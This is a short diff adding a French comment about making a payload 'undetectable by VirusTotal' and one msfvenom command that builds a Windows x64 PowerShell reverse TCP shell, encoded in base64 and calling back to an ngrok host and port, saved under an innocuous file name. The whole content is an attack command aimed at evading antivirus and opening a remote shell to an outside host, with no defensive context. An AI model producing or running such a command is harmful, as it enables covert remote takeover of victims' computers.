@@ -1,0 +1,4 @@
+/// Créé PayLoad indetectable par (VirusTotal)
+
+msfvenom -p windows/x64/powershell_reverse_tcp LHOST=5.tcp.eu.ngrok.io LPORT=13442 -e php/base64 -o legume.txt
+
